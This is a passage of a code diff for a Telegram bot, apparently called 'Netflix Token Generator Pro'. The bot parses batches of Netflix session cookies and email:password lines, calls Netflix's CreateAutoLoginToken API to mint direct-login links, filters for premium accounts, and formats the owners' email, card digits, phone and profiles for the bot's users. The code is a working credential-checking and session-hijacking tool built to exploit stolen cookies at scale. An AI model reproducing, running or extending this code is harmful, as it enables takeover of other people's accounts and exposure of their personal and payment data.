-                    seen_hashes.add(cookie_hash)
-                    results.append(raw_cookies)
-        return results
-
-    def build_cookie_string(self, cookie_dict: Dict[str, str]) -> str:
-        return '; '.join([f"{k}={v}" for k, v in cookie_dict.items() if not k.startswith('_')])
-
-    # ========== DETAILS FETCHING (NO CUSTOM API) ==========
-    def fetch_account_details(self, cookie_dict: Dict[str, str], source_file: str = "") -> AccountDetails:
-        details = AccountDetails()
-        details.is_active = True
-
-        try:
-            cache_key = f"account_{hashlib.md5(str(sorted(cookie_dict.items())).encode()).hexdigest()}"
-            cached = self.cache.get(cache_key)
-            if cached:
-                with self.stats_lock:
-                    self.cache_hits += 1
-                return cached
-
-            with self.stats_lock:
-                self.cache_misses += 1
-
-            # No external API calls – only fallback from filename
-            self._extract_from_filename(source_file, details)
-
-            if not details.plan_type and not details.profile_name and not details.country and not details.email:
-                details.is_active = False
-
-            self.cache.set(cache_key, details, ttl=300)
-            return details
-
-        except Exception as e:
-            logging.error(f"Unexpected error in fetch_account_details: {e}")
-            logging.debug(traceback.format_exc())
-            details.is_active = False
-            return details
-
-    def _extract_from_filename(self, source_file: str, details: AccountDetails):
-        if not source_file:
-            return
-        import re
-        email_match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', source_file)
-        if email_match and not details.email:
-            details.email = email_match.group(1)
-        country_match = re.search(r'\[([A-Z]{2})\]', source_file)
-        if country_match and not details.country:
-            details.country = country_match.group(1)
-        plan_match = re.search(r'\[(Premium|Standard|Basic)\]', source_file, re.IGNORECASE)
-        if plan_match and not details.plan_type:
-            details.plan_type = plan_match.group(1).capitalize()
-            if 'premium' in details.plan_type.lower():
-                details.subscription_tier = SubscriptionTier.PREMIUM
-            elif 'standard' in details.plan_type.lower():
-                details.subscription_tier = SubscriptionTier.STANDARD
-            elif 'basic' in details.plan_type.lower():
-                details.subscription_tier = SubscriptionTier.BASIC
-
-    # ========== TOKEN GENERATION ==========
-    def generate_token(self, cookie_dict: Dict[str, str]) -> Tuple[bool, Optional[str], Optional[AccountDetails], Optional[str]]:
-        start_time = time.time()
-        request_id = RequestIDGenerator.generate("TOK")
-
-        try:
-            if "NetflixId" not in cookie_dict:
-                return False, None, None, "Missing NetflixId cookie"
-            if "SecureNetflixId" not in cookie_dict:
-                return False, None, None, "Missing SecureNetflixId cookie"
-
-            cookie_str = self.build_cookie_string(cookie_dict)
-            self._rotate_headers()
-
-            token_payload = {
-                "operationName": "CreateAutoLoginToken",
-                "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
-                "extensions": {
-                    "persistedQuery": {
-                        "version": 102,
-                        "id": "76e97129-f4b5-41a0-a73c-12e674896849",
-                    }
-                },
-            }
-
-            headers = self.headers.copy()
-            headers["Cookie"] = cookie_str
-            headers["X-Netflix.RequestIdentifier"] = request_id
-
-            response = self.session.post(
-                self.api_url,
-                headers=headers,
-                json=token_payload,
-                timeout=REQUEST_TIMEOUT,
-            )
-
-            if response.status_code == 200:
-                data = response.json()
-
-                if data.get("data") and "createAutoLoginToken" in data["data"]:
-                    token = data["data"]["createAutoLoginToken"]
-
-                    try:
-                        source_file = cookie_dict.get('_source', '')
-                        account_details = self.fetch_account_details(cookie_dict, source_file=source_file)
-                    except Exception:
-                        account_details = AccountDetails(is_active=False)
-
-                    return True, token, account_details, None
-
-                if "errors" in data and data["errors"]:
-                    error_msg = data["errors"][0].get("message", "Unknown API error")
-                    if "AccessDeniedException" in error_msg or "SBD" in error_msg:
-                        return False, None, None, "Access denied, cookie invalid or expired"
-                    return False, None, None, f"API Error: {error_msg}"
-
-                return False, None, None, "Unexpected API response format"
-
-            error_text = (response.text or "")[:200] or "No response body"
-            return False, None, None, f"HTTP {response.status_code}: {error_text}"
-
-        except requests.exceptions.Timeout:
-            return False, None, None, f"Request timeout after {REQUEST_TIMEOUT}s"
-        except requests.exceptions.ConnectionError:
-            return False, None, None, "Connection error, check network"
-        except requests.exceptions.RequestException as e:
-            return False, None, None, f"Request error: {e}"
-        except json.JSONDecodeError:
-            return False, None, None, "Invalid JSON response from API"
-        except Exception as e:
-            logging.error(f"Unexpected error in generate_token: {e}")
-            return False, None, None, f"Unexpected error: {e}"
-
-    def process_item(self, item: Dict[str, Any]) -> CheckResult:
-        result = CheckResult(
-            cookies_used={k: v for k, v in item.items() if not k.startswith('_')},
-            format_type=item.get('_format', 'unknown'),
-            source_file=item.get('_source', 'unknown'),
-            source_line=item.get('_source_line'),
-            request_id=RequestIDGenerator.generate("CHK")
-        )
-        start_time = time.time()
-        try:
-            with self.stats_lock:
-                self.total_processed += 1
-            if item.get('_needs_login'):
-                result.success = False
-                result.error = "Email:pass login requires browser automation"
-                result.error_code = "LOGIN_REQUIRED"
-            else:
-                success, token, account_details, error = self.generate_token(item)
-                result.success = success
-                result.token = token
-                result.account_details = account_details
-                result.error = error
-                if error:
-                    if "timeout" in error.lower():
-                        result.error_code = "TIMEOUT"
-                    elif "connection" in error.lower():
-                        result.error_code = "CONNECTION_ERROR"
-                    elif "missing" in error.lower():
-                        result.error_code = "MISSING_COOKIES"
-                    elif "API" in error:
-                        result.error_code = "API_ERROR"
-                    else:
-                        result.error_code = "UNKNOWN_ERROR"
-        except Exception as e:
-            result.success = False
-            result.error = str(e)
-            result.error_code = "EXCEPTION"
-            logging.error(f"Error processing item: {e}")
-            logging.debug(traceback.format_exc())
-        result.processing_time = time.time() - start_time
-        return result
-
-# ==================== OUTPUT FORMATTER ====================
-class PremiumOutputFormatter:
-    """Format output in premium template"""
-    
-    @staticmethod
-    def format_premium_account(
-        source_file: str,
-        account_details: AccountDetails,
-        token: str,
-        cookies: Dict[str, str],
-        mode: str = "Full Information"
-    ) -> str:
-        """Format account output in premium template"""
-        
-        # Check if we have valid account details
-        if not account_details or not account_details.is_active:
-            # Return token-only format with error message
-            expiry = TokenExpiryCalculator.calculate_expiry()
-            cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items() if not k.startswith('_')])
-            
-            return (
-                "⚠️ **PARTIAL ACCOUNT DATA** ⚠️\n\n"
-                f"📁 **Source:** `{source_file}`\n"
-                f"⚠️ **Status:** `Token Generated but Account Details Unavailable`\n\n"
-                "🔑 **Token Information:**\n"
-                f"• **Generated:** `{expiry['generated']}`\n"
-                f"• **Expires:** `{expiry['expires']}`\n"
-                f"• **Remaining:** `{expiry['remaining']}`\n"
-                f"• **Phone Login:** [Click to login](https://netflix.com/unsupported?nftoken={token})\n"
-                f"• **PC Login:** [Click to Login](https://netflix.com/account?nftoken={token})\n\n"
-                "🍪 **Cookie:** \n"
-                f"```\n{cookie_str}\n```\n\n"
-                "⚠️ **Note:** Account details could not be fetched. The cookie may be:\n"
-                "• Expired or invalid\n"
-                "• From a region with restricted access\n"
-                "• Missing required permissions\n"
-                "• Blocked by Netflix security\n\n"
-                f"📊 **Account Filter:** `Premium Only`\n"
-                f"🎯 **Mode:** `{mode}`"
-            )
-        
-        # Get country flag and name
-        flag = CountryFlagMapper.get_flag(account_details.country or "US")
-        country_name = CountryFlagMapper.get_country_name(account_details.country or "US")
-        
-        # Calculate token expiry
-        expiry = TokenExpiryCalculator.calculate_expiry()
-        
-        # Build profiles list string
-        profiles = account_details.profile_names or []
-        if account_details.profile_name and account_details.profile_name not in profiles:
-            profiles.insert(0, account_details.profile_name)
-        profiles_str = ", ".join(profiles) if profiles else "None"
-        
-        # Get plan price based on country
-        prices = {
-            'IN': {'Basic': '₹199', 'Standard': '₹499', 'Premium': '₹649', 'Premium_4K': '₹649'},
-            'US': {'Basic': '$9.99', 'Standard': '$15.49', 'Premium': '$19.99', 'Premium_4K': '$19.99'},
-            'GB': {'Basic': '£6.99', 'Standard': '£10.99', 'Premium': '£15.99', 'Premium_4K': '£15.99'},
-            'CA': {'Basic': 'CA$9.99', 'Standard': 'CA$16.49', 'Premium': 'CA$20.99', 'Premium_4K': 'CA$20.99'},
-            'AU': {'Basic': 'AU$10.99', 'Standard': 'AU$16.99', 'Premium': 'AU$22.99', 'Premium_4K': 'AU$22.99'},
-            'DE': {'Basic': '€7.99', 'Standard': '€12.99', 'Premium': '€17.99', 'Premium_4K': '€17.99'},
-            'FR': {'Basic': '€8.99', 'Standard': '€13.99', 'Premium': '€17.99', 'Premium_4K': '€17.99'},
-            'JP': {'Basic': '¥990', 'Standard': '¥1490', 'Premium': '¥1980', 'Premium_4K': '¥1980'},
-            'BR': {'Basic': 'R$25.90', 'Standard': 'R$39.90', 'Premium': 'R$55.90', 'Premium_4K': 'R$55.90'},
-            'MX': {'Basic': 'MX$139', 'Standard': 'MX$219', 'Premium': 'MX$299', 'Premium_4K': 'MX$299'},
-        }
-        
-        country_prices = prices.get(account_details.country or 'US', prices['US'])
-        plan_key = account_details.subscription_tier.value.capitalize() if account_details.subscription_tier else 'Basic'
-        price = country_prices.get(plan_key, 'Unknown')
-        
-        # Quality and streams based on plan
-        quality_map = {
-            SubscriptionTier.BASIC: 'HD720p',
-            SubscriptionTier.STANDARD: 'Full HD1080p',
-            SubscriptionTier.PREMIUM: 'Ultra HD4K',
-            SubscriptionTier.PREMIUM_4K: 'Ultra HD4K',
-            SubscriptionTier.AD_SUPPORTED: 'HD720p',
-            SubscriptionTier.UNKNOWN: 'Unknown'
-        }
-        
-        streams_map = {
-            SubscriptionTier.BASIC: '1',
-            SubscriptionTier.STANDARD: '2',
-            SubscriptionTier.PREMIUM: '4',
-            SubscriptionTier.PREMIUM_4K: '4',
-            SubscriptionTier.AD_SUPPORTED: '1',
-            SubscriptionTier.UNKNOWN: '1'
-        }
-        
-        # Member since formatting
-        member_since = account_details.member_since.strftime('%B %Y') if account_details.member_since else 'Unknown'
-        
-        # Next billing
-        if account_details.next_billing:
-            next_billing = account_details.next_billing.strftime('%d %B %Y')
-        elif account_details.member_since:
-            # Estimate next billing as 1 year from member since
-            next_billing = (account_details.member_since + timedelta(days=365)).strftime('%d %B %Y')
-        else:
-            next_billing = 'Unknown'
-        
-        # Card info
-        if account_details.card_type and account_details.card_last4:
-            card_info = f"{account_details.card_type} •••• {account_details.card_last4}"
-        else:
-            card_info = 'Unknown •••• Unknown'
-        
-        # Card expiry
-        if account_details.card_expiry:
-            card_expiry = account_details.card_expiry
-        else:
-            card_expiry = 'Unknown'
-        
-        # Phone
-        phone_str = f"{account_details.phone or 'Unknown'} ({'Yes' if account_details.phone_verified else 'No'})"
-        
-        # Hold status
-        hold_status = 'Yes' if account_details.on_hold else 'No'
-        
-        # Extra member
-        extra_member = 'Yes' if account_details.has_extra_member else 'No'
-        extra_member_slots = str(account_details.extra_member_slots) if account_details.extra_member_slots > 0 else 'Unknown'
-        
-        # Email verified
-        email_verified = 'Yes' if account_details.email_verified else 'No'
-        
-        # Membership status
-        membership_status = account_details.status.value.upper() if account_details.status else 'CURRENT_MEMBER'
-        
-        # Build output with exact template
-        output_lines = [
-            "🌟 **PREMIUM ACCOUNT** 🌟",
-            "",
-            f"📁 **Source:** `{source_file}`",
-            f"✅ **Status:** `Valid Premium Account`",
-            "",
-            "👤 **Account Details:**",
-            f"• **Name:** `{account_details.profile_name or account_details.primary_profile or 'Unknown'}`",
-            f"• **Email:** `{account_details.email or cookies.get('email', 'Unknown')}`",
-            f"• **Country:** `{country_name} {flag} ({account_details.country or 'Unknown'})`",
-            f"• **Plan:** `{account_details.plan_type or account_details.subscription_tier.value.capitalize() if account_details.subscription_tier else 'Unknown'}`",
-            f"• **Price:** `{price}`",
-            f"• **Member Since:** `{member_since}`",
-            f"• **Next Billing:** `{next_billing}`",
-            f"• **Payment:** `{account_details.payment_method or 'Unknown'}`",
-            f"• **Card:** `{card_info}`",
-            f"• **Phone:** `{phone_str}`",
-            f"• **Quality:** `{quality_map.get(account_details.subscription_tier, 'Unknown')}`",
-            f"• **Streams:** `{streams_map.get(account_details.subscription_tier, '1')}`",
-            f"• **Hold Status:** `{hold_status}`",
-            f"• **Extra Member:** `{extra_member}`",
-            f"• **Extra Member Slot:** `{extra_member_slots}`",
-            f"• **Email Verified:** `{email_verified}`",
-            f"• **Membership Status:** `{membership_status}`",
-            f"• **Connected Profiles:** `{account_details.profile_count}`",
-            f"• **Profiles:** `{profiles_str}`",
-            "",
-            "🔑 **Token Information:**",
-            f"• **Generated:** `{expiry['generated']}`",
-            f"• **Expires:** `{expiry['expires']}`",
-            f"• **Remaining:** `{expiry['remaining']}`",
-            f"• **Phone Login:** [Click to login](https://netflix.com/unsupported?nftoken={token})",
-            f"• **PC Login:** [Click to Login](https://netflix.com/account?nftoken={token})",
-            "",
-            "🍪 **Cookie:** "
-        ]
-        
-        # Add cookie as code block
-        cookie_str = "; ".join([f"{k}={v}" for k, v in cookies.items() if not k.startswith('_')])
-        output_lines.append(f"```\n{cookie_str}\n```")
-        output_lines.append("")
-        output_lines.append(f"📊 **Account Filter:** `Premium Only`")
-        output_lines.append(f"🎯 **Mode:** `{mode}`")
-        
-        return "\n".join(output_lines)
-    
-    @staticmethod
-    def format_batch_report(batch_result: BatchResult) -> str:
-        """Format batch processing report"""
-        
-        output = []
-        output.append("📊 **BATCH PROCESSING REPORT**")
-        output.append("=" * 50)
-        output.append("")
-        output.append(f"📁 **File:** `{batch_result.file_name or 'Unknown'}`")
-        output.append(f"⏱️ **Started:** `{batch_result.start_time.strftime('%Y-%m-%d %H:%M:%S')}`")
-        if batch_result.end_time:
-            output.append(f"⏱️ **Completed:** `{batch_result.end_time.strftime('%Y-%m-%d %H:%M:%S')}`")
-            total_time = (batch_result.end_time - batch_result.start_time).total_seconds()
-            output.append(f"⏱️ **Total Time:** `{total_time:.2f}s`")
-        output.append("")
-        
-        output.append("📈 **STATISTICS**")
-        output.append(f"• **Total Processed:** `{batch_result.total}`")
-        output.append(f"• **✅ Successful:** `{batch_result.success}`")
-        output.append(f"• **❌ Failed:** `{batch_result.failed}`")
-        output.append(f"• **💎 Premium:** `{batch_result.premium}`")
-        output.append(f"• **📺 Standard:** `{batch_result.standard}`")
-        output.append(f"• **📱 Basic:** `{batch_result.basic}`")
-        output.append(f"• **❓ Unknown:** `{batch_result.unknown}`")
-        output.append(f"• **⚡ Avg Time:** `{batch_result.avg_time:.2f}s`")
-        output.append(f"• **📊 Success Rate:** `{(batch_result.success/batch_result.total*100 if batch_result.total else 0):.1f}%`")
-        output.append("")
-        
-        output.append("📋 **DETAILED RESULTS**")
-        output.append("-" * 50)
-        
-        for i, result in enumerate(batch_result.results, 1):
-            output.append("")
-            output.append(f"**[{i}] {result.source_file or 'Unknown'}**")
-            
-            if result.success:
-                output.append(f"   ✅ **Token:** `{result.token[:50]}...`" if result.token and len(result.token) > 50 else f"   ✅ **Token:** `{result.token}`")
-                
-                if result.account_details:
-                    tier = result.account_details.subscription_tier.value.upper()
-                    tier_emoji = "💎" if "PREMIUM" in tier else "📺" if "STANDARD" in tier else "📱"
-                    output.append(f"   {tier_emoji} **Tier:** `{tier}`")
-                    
-                    if result.account_details.country:
-                        flag = CountryFlagMapper.get_flag(result.account_details.country)
-                        output.append(f"   🌍 **Country:** `{result.account_details.country} {flag}`")
-                    
-                    if result.account_details.profile_name:
-                        output.append(f"   👤 **Profile:** `{result.account_details.profile_name}`")
-                    
-                    if result.account_details.profile_count:
-                        output.append(f"   📺 **Profiles:** `{result.account_details.profile_count}`")
-            else:
-                output.append(f"   ❌ **Error:** `{result.error or 'Unknown error'}`")
-                if result.error_code:
-                    output.append(f"   ⚠️ **Code:** `{result.error_code}`")
-            
-            output.append(f"   ⏱️ **Time:** `{result.processing_time:.2f}s`")
-            output.append(f"   📁 **Format:** `{result.format_type}`")
-        
-        return "\n".join(output)
-
-# ==================== BOT CLASS ====================
-class NetflixTokenBot:
-    """Main bot class with all commands and handlers"""
-
+class NetflixCheckerBot:
     def __init__(self, token: str):
         self.token = token
-        self.processor = NetflixTokenGenerator()
-        self.stats = BotStats()
-        self.formatter = PremiumOutputFormatter()
-        self.application = None
-        self.active_tasks: Dict[int, Dict[str, Any]] = {}
-        self.shutdown_event = threading.Event()
-
-        if not TELEGRAM_AVAILABLE:
-            print("⚠️ Running in test mode without Telegram")
-
-    def get_keyboard(self):
-        """Get main menu keyboard"""
-        if not TELEGRAM_AVAILABLE:
-            return None
-
-        keyboard = [
-            [
-                InlineKeyboardButton("🎬 Token Only", callback_data="tokenonly"),
-                InlineKeyboardButton("📊 Full Info", callback_data="fullinfo")
-            ],
-            [
-                InlineKeyboardButton("⚡ Batch Process", callback_data="batch"),
-                InlineKeyboardButton("📈 Stats", callback_data="stats")
-            ],
-            [
-                InlineKeyboardButton("❓ Help", callback_data="help"),
-                InlineKeyboardButton("🛑 Cancel", callback_data="cancel")
-            ]
-        ]
-        return InlineKeyboardMarkup(keyboard)
-
-    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user = update.effective_user
-        self.stats.add_user(user.id)
-        stats = self.stats.get_stats_summary()
-
-        welcome_text = (
-            f"🎬 **Netflix Token Generator Pro v{BOT_VERSION}** 🚀\n\n"
-            f"✨ **Features:**\n"
-            f"• 🍪 Extract NetflixId from ANY format\n"
-            f"• 🔍 Check account validity & details\n"
-            f"• 🔑 Generate Direct Login tokens\n"
-            f"• 💎 Filter Premium accounts only\n"
-            f"• ⚡ Multi-threaded processing (10x faster)\n"
-            f"• 📊 Detailed analytics & reporting\n\n"
-            f"📁 **Supported Formats:**\n"
-            f"• Text files (.txt)\n"
-            f"• JSON files (.json)\n"
-            f"• ZIP archives\n"
-            f"• Header strings\n"
-            f"• Netscape format\n"
-            f"• Email:Password format\n\n"
-            f"⚡ **Quick Commands:**\n"
-            f"`/start` - Show this message\n"
-            f"`/tokenonly` - Token info only\n"
-            f"`/fullinfo` - Full account details\n"
-            f"`/batch` - Batch process files\n"
-            f"`/stats` - Bot statistics\n"
-            f"`/cancel` - Stop current task\n\n"
-            f"📈 **Current Stats:**\n"
-            f"• {stats['total_users']}+ Active Users\n"
-            f"• {stats['success_rate']:.1f}% Success Rate\n"
-            f"• {stats['premium_accounts']} Premium Accounts Found\n"
-            f"• ⚡ Avg Response: {stats['avg_response_time']:.2f}s\n\n"
-            f"👋 Welcome, {user.first_name}! Ready to generate tokens."
-        )
-
-        await update.message.reply_text(
-            welcome_text,
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=self.get_keyboard()
-        )
-
-    async def tokenonly(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        context.user_data['mode'] = 'tokenonly'
-        await update.message.reply_text(
-            "🔑 **Token Only Mode Activated**\n\n"
-            "Send me cookies in any format, and I'll return just the NFToken.\n"
-            "Fastest processing - no account details fetched.",
-            parse_mode=ParseMode.MARKDOWN
-        )
-
-    async def fullinfo(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        context.user_data['mode'] = 'fullinfo'
-        await update.message.reply_text(
-            "📊 **Full Info Mode Activated**\n\n"
-            "Send me cookies, and I'll return:\n"
-            "• NFToken\n"
-            "• Subscription tier\n"
-            "• Account country\n"
-            "• Profile info\n"
-            "• Member since\n"
-            "• Premium status\n"
-            "• And much more...",
-            parse_mode=ParseMode.MARKDOWN
-        )
-
-    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        stats = self.stats.get_stats_summary()
-
-        stats_text = (
-            "📊 **Bot Statistics**\n\n"
-            f"👥 **Total Users:** `{stats['total_users']}`\n"
-            f"📅 **Active Today:** `{stats['active_today']}`\n"
-            f"✅ **Total Checks:** `{stats['total_checks']}`\n"
-            f"📈 **Success Rate:** `{stats['success_rate']:.1f}%`\n"
-            f"💎 **Premium Found:** `{stats['premium_accounts']}`\n"
-            f"⏱️ **Uptime:** `{stats['uptime']}`\n"
-            f"⚡ **Avg Response:** `{stats['avg_response_time']:.2f}s`\n"
-            f"📅 **Today:** `{stats['checks_today']}` checks\n"
-            f"📁 **Files Processed:** `{stats['total_files']}`\n"
-            f"📦 **Batches:** `{stats['total_batches']}`\n\n"
-            "📁 **Format Breakdown:**\n" +
-            '\n'.join([f"• `{fmt}`: `{count}`" for fmt, count in stats['format_breakdown'].items()]) +
-            "\n\n❌ **Top Errors:**\n" +
-            ('\n'.join([f"• `{err}`: `{count}`" for err, count in stats['error_breakdown'].items()]) or "• None")
-        )
-
-        await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN)
-
-    async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        user_id = update.effective_user.id
-        task = self.active_tasks.get(user_id)
-        if task and not task.get('cancelled', False):
-            task['cancelled'] = True
-            task['cancel'] = True
-            await update.message.reply_text("🛑 Cancellation requested. Stopping...")
-        else:
-            await update.message.reply_text("No active task to cancel.")
-
-    async def batch_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        mode = context.user_data.get('mode', 'tokenonly')
-        context.user_data['batch_mode'] = True
-        context.user_data['batch_source'] = None
-        await update.message.reply_text(
-            f"📁 **Batch Mode Activated**\n"
-            f"📊 **Mode:** `{mode}`\n\n"
-            "Send me a **.txt file**, **.zip file**, or **plain text** (one item per line).\n"
-            "I'll process each line and show live progress.\n"
-            "Use /cancel to stop.",
-            parse_mode=ParseMode.MARKDOWN
-        )
-
-    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not context.user_data.get('batch_mode'):
-            await update.message.reply_text("❌ Please use /batch first.")
-            return
-
-        context.user_data['batch_mode'] = False
-        file = update.message.document
-        user_id = update.effective_user.id
-
-        if user_id in self.active_tasks:
-            await update.message.reply_text("❌ A task is already running. Use /cancel to stop it first.")
-            return
-
-        if file.file_size > MAX_FILE_SIZE:
-            await update.message.reply_text(f'❌ File too large. Max: {MAX_FILE_SIZE//1024//1024}MB')
-            return
-
-        status_msg = await update.message.reply_text("📥 Downloading file...")
-
-        try:
-            telegram_file = await file.get_file()
-            content = io.BytesIO()
-            await telegram_file.download_to_memory(content)
-            content.seek(0)
-
-            all_items = []
-            if file.file_name.endswith('.zip'):
-                with zipfile.ZipFile(content) as zf:
-                    for name in zf.namelist():
-                        if name.endswith('.txt') or name.endswith('.json'):
-                            with zf.open(name) as f:
-                                text = f.read().decode('utf-8', errors='ignore')
-                                items = self.processor.extract_all_formats(text)
-                                for it in items:
-                                    it['_source'] = f"{file.file_name}/{name}"
-                                    all_items.append(it)
-            else:
-                text = content.read().decode('utf-8', errors='ignore')
-                items = self.processor.extract_all_formats(text)
-                for it in items:
-                    it['_source'] = file.file_name
-                    all_items.append(it)
-
-            if not all_items:
-                await status_msg.edit_text("❌ No valid cookies found in the file.")
-                return
-
-            mode = context.user_data.get('mode', 'fullinfo')
-            await self._process_batch(
-                update, context, user_id, all_items, mode,
-                f"File: {file.file_name}", status_msg
-            )
-
-        except Exception as e:
-            await status_msg.edit_text(f"❌ Error reading file: {str(e)}")
-            logging.error(traceback.format_exc())
-
-    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not context.user_data.get('batch_mode'):
-            await self._handle_single(update, context)
-            return
-
-        context.user_data['batch_mode'] = False
-        user_id = update.effective_user.id
-        text = update.message.text
-
-        if user_id in self.active_tasks:
-            await update.message.reply_text("❌ A task is already running. Use /cancel to stop it first.")
-            return
-
-        lines = [line.strip() for line in text.splitlines() if line.strip()]
-        if not lines:
-            await update.message.reply_text("❌ No non‑empty lines found.")
-            return
-
-        all_items = []
-        for line in lines:
-            items = self.processor.extract_all_formats(line)
-            all_items.extend(items)
-
-        if not all_items:
-            await update.message.reply_text("❌ No valid cookie lines found.")
-            return
-
-        mode = context.user_data.get('mode', 'fullinfo')
-        status_msg = await update.message.reply_text("📥 Preparing batch...")
-        await self._process_batch(
-            update, context, user_id, all_items, mode,
-            "Text input", status_msg
-        )
-
-    async def _handle_single(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not update.message or not update.message.text:
-            return
-
-        text = update.message.text
-        mode = context.user_data.get('mode', 'tokenonly')
-        self.stats.update_concurrent(1)
-
-        try:
-            await update.message.chat.send_action(action="typing")
-            items = self.processor.extract_all_formats(text)
-            if not items:
-                await update.message.reply_text(
-                    "❌ **No valid Netflix credentials found**\n\n"
-                    "Supported formats:\n"
-                    "• Netscape cookies\n"
-                    "• Raw cookie strings\n"
-                    "• JSON objects\n"
-                    "• Header strings\n"
-                    "• Email:Password",
-                    parse_mode=ParseMode.MARKDOWN
-                )
-                return
-
-            item = items[0]
-            format_type = item.get('_format', 'unknown')
-            result = self.processor.process_item(item)
-
-            self.stats.record_check(
-                result.success,
-                result.account_details and result.account_details.subscription_tier in [SubscriptionTier.PREMIUM, SubscriptionTier.PREMIUM_4K],
-                format_type,
-                result.error_code,
-                result.processing_time
-            )
-
-            if result.success and result.token:
-                if mode == 'tokenonly':
-                    link = f"https://netflix.com/?nftoken={result.token}"
-                    response = (
-                        f"✅ **Token Generated!**\n\n"
-                        f"**NFToken:** `{result.token}`\n"
-                        f"**Link:** {link}\n"
-                        f"**Format:** `{format_type}`\n"
-                        f"**Time:** `{result.processing_time:.2f}s`"
-                    )
-                    if result.account_details and result.account_details.subscription_tier != SubscriptionTier.UNKNOWN:
-                        tier_emoji = "💎" if result.account_details.subscription_tier in [SubscriptionTier.PREMIUM, SubscriptionTier.PREMIUM_4K] else "📺"
-                        response += f"\n**Tier:** {tier_emoji} `{result.account_details.subscription_tier.value.upper()}`"
-                    await update.message.reply_text(response, parse_mode=ParseMode.MARKDOWN)
-                else:
-                    output = PremiumOutputFormatter.format_premium_account(
-                        source_file='Direct Input',
-                        account_details=result.account_details or AccountDetails(),
-                        token=result.token,
-                        cookies=result.cookies_used,
-                        mode='Full Information'
-                    )
-                    await update.message.reply_text(output, parse_mode=ParseMode.MARKDOWN)
-            else:
-                error_msg = result.error or "Unknown error"
-                await update.message.reply_text(
-                    f"❌ **Failed!**\n\n"
-                    f"**Error:** `{error_msg}`\n"
-                    f"**Code:** `{result.error_code or 'N/A'}`\n"
-                    f"**Format:** `{format_type}`\n"
-                    f"**Time:** `{result.processing_time:.2f}s`",
-                    parse_mode=ParseMode.MARKDOWN
-                )
-        except Exception as e:
-            logging.error(f"Error in _handle_single: {e}")
-            logging.debug(traceback.format_exc())
-            await update.message.reply_text(f"❌ **Error:** `{str(e)}`", parse_mode=ParseMode.MARKDOWN)
-        finally:
-            self.stats.update_concurrent(-1)
-
-    async def _process_batch(self, update: Update, context: ContextTypes.DEFAULT_TYPE,
-                             user_id: int, items: List[Dict], mode: str,
-                             source_desc: str, status_msg):
-        total = len(items)
-        start_time = time.time()
-        results = []
-        valid = 0
-        invalid = 0
-        errors = 0
-
-        self.active_tasks[user_id] = {
-            'cancel': False,
-            'cancelled': False,
-            'processed': 0
+        self.config = DEFAULT_CONFIG
+        self.active_tasks: Dict[int, Dict] = {}
+        self.stats = {
+            "total_checks": 0, "success": 0, "premium": 0,
+            "errors": defaultdict(int), "total_time": 0.0,
         }
+        self.stats_lock = threading.Lock()
 
-        await self._update_progress(status_msg, 0, total, valid, invalid, errors,
-                                     source_desc, mode, start_time)
+    def update_stats(self, success: bool, is_premium: bool, error_type: Optional[str] = None, processing_time: float = 0.0):
+        with self.stats_lock:
+            self.stats["total_checks"] += 1
+            if success:
+                self.stats["success"] += 1
+            if is_premium:
+                self.stats["premium"] += 1
+            if error_type:
+                self.stats["errors"][error_type] += 1
+            self.stats["total_time"] += processing_time
 
-        for idx, item in enumerate(items, 1):
-            if self.active_tasks[user_id].get('cancel', False):
-                elapsed = time.time() - start_time
-                cancel_text = (
-                    f"🚫 **Task Successfully Cancelled**\n\n"
-                    f"Processed: {idx-1}/{total}\n"
-                    f"Status: Cancellation complete\n"
-                    f"Duration: {elapsed:.1f}s\n\n"
-                    f"Bot is now ready for new tasks."
-                )
-                await status_msg.edit_text(cancel_text, parse_mode=ParseMode.MARKDOWN)
-                del self.active_tasks[user_id]
-                return
-
-            result = await asyncio.get_event_loop().run_in_executor(
-                None, self.processor.process_item, item
+    def get_stats_summary(self) -> str:
+        with self.stats_lock:
+            total = self.stats["total_checks"]
+            success_rate = (self.stats["success"] / total * 100) if total else 0
+            avg_time = (self.stats["total_time"] / total) if total else 0
+            top_errors = sorted(self.stats["errors"].items(), key=lambda x: x[1], reverse=True)[:3]
+            err_str = "\n".join(f"  • {err}: {cnt}" for err, cnt in top_errors) if top_errors else "None"
+            return (
+                f"📊 **Bot Statistics**\n\n"
+                f"Total checks: {total}\n"
+                f"Success rate: {success_rate:.1f}%\n"
+                f"Premium accounts: {self.stats['premium']}\n"
+                f"Avg processing: {avg_time:.2f}s\n"
+                f"Top errors:\n{err_str}"
             )
-            results.append(result)
 
-            if result.success and result.token:
-                valid += 1
-                if mode == 'fullinfo':
-                    output = PremiumOutputFormatter.format_premium_account(
-                        source_file=result.source_file or source_desc,
-                        account_details=result.account_details or AccountDetails(),
-                        token=result.token,
-                        cookies=result.cookies_used,
-                        mode='Full Information'
-                    )
-                    await update.message.reply_text(output, parse_mode=ParseMode.MARKDOWN)
-                    await asyncio.sleep(0.3)
-                elif mode == 'tokenonly':
-                    link = f"https://netflix.com/?nftoken={result.token}"
-                    msg = f"✅ **Token:** `{result.token}`\n🔗 {link}"
-                    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
-                    await asyncio.sleep(0.2)
-            elif result.error:
-                errors += 1
-            else:
-                invalid += 1
+    async def check_single_cookie(self, cookie_text: str) -> Dict:
+        """Process one cookie string and return result dict"""
+        start = time.time()
+        result = {
+            "success": False,
+            "is_subscribed": False,
+            "plan_key": "unknown",
+            "plan_label": "Unknown",
+            "country": None,
+            "email": None,
+            "profiles": None,
+            "token": None,
+            "error": None,
+            "formatted_output": None,
+            "processing_time": 0.0,
+        }
+        try:
+            netscape = extract_netflix_cookie_text(cookie_text)
+            if not netscape:
